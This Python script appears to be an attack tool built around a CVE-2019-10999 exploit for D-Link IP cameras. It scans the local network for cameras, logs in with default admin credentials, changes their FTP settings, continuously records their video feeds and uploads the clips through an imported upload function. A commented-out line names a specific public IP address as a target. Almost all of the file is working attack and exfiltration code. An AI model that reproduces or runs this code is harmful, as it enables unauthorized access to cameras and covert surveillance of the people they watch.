import requests
import socket
import ipaddress
import threading
import numpy as np
import time
from CVE_2019_10999.DlinkExploit import util, version
import tempfile
import cv2
from upload import upload
import os
from ftpsetting import set_camera_ftp_settings
tempd = tempfile.mkdtemp()
import os.path as op 
default_port = 37591
debug = True

def get_local_network():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    network = ipaddress.IPv4Network(local_ip + '/24', strict=False)
    return network.hosts()

def scan_camera(local_network):
    result = []
    threads = []
    for ip in local_network:
        t = threading.Thread(target=scanner_thread, args=(ip,result))
        threads.append(t)
        t.start()
        if len(result) >= 10:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()
    return result

def scanner_thread(ip,result):
    try:
        response = version.get_camera_version(ip, default_port)
    except:
        return
    if response is not None:
        result.append(ip)

def workload():
    #scan the network
    local_network = get_local_network()
    print(local_network)
    camera_ips = scan_camera(local_network)
    threads = []
    print(camera_ips)
    for ip in camera_ips:
        print("start camera thread for camera {}".format(ip))
        threads.append(threading.Thread(target=camera_work,args=(ip,)))
        threads[-1].start()
    for t in threads:
        t.join()

    pass


def get_url_pic(url,auth):
    try:
        r = requests.get(url, auth=auth)
        image = np.asarray(bytearray(r.content), dtype="uint8")
        image = cv2.imdecode(image, cv2.IMREAD_COLOR)
    except:
        return None
    return image


def camera_work(target_ip,target_port=default_port,username="admin",password=""):
    try:
        
        threading.Thread(target=set_camera_ftp_settings,args=(target_ip,target_port,username,password)).start()
    except:
        pass
    auth = util.create_http_auth(target_ip, target_port, username, password)
    if auth is None:
        print('Invalid authentication type. Neither basic or digest are '
              'supported.')
        return
    url = 'http://%s:%s/image.jpg' % (target_ip, target_port)
    #get the first frame
    image = get_url_pic(url,auth)
    while image is None:
        time.sleep(60)
        image = get_url_pic(url,auth)
    shape = image.shape[:2]
    while True:
        kwargs = {"target_ip":target_ip,"url":url,"auth":auth,"shape":shape}
        threading.Thread(target=timed_capture_thread,kwargs=kwargs).start()
        time.sleep(30)

def timed_capture_thread(target_ip,url,auth,shape):
    start_time = int(time.time())
    target_ip = str(target_ip)
    video_name = op.join(target_ip, f'{start_time}.avi')
    video_path = op.join(tempd, video_name)
    if not op.exists(op.join(tempd, target_ip)):
        os.mkdir(op.join(tempd, target_ip))
    print(video_path)
    video = cv2.VideoWriter(video_path,cv2.VideoWriter_fourcc(*'XVID'), 30, (shape[1],shape[0]))
    print("start recording")
    for i in range(30*10):
        frame_time = time.time()
        image = get_url_pic(url,auth)
        if image is None:
            video.write(np.zeros(shape))
        else:
            video.write(image)
        remain_time = 1/30 - (time.time() - frame_time)
        if remain_time > 0:
            time.sleep(remain_time)
    video.release()
    upload(video_path, target_ip)
    os.remove(video_path)
    
def main():
    # download the newest version of the exploit

    # run the exploit
    workload()
    #camera_work("73.238.133.237",37591)

if __name__=='__main__':
    main()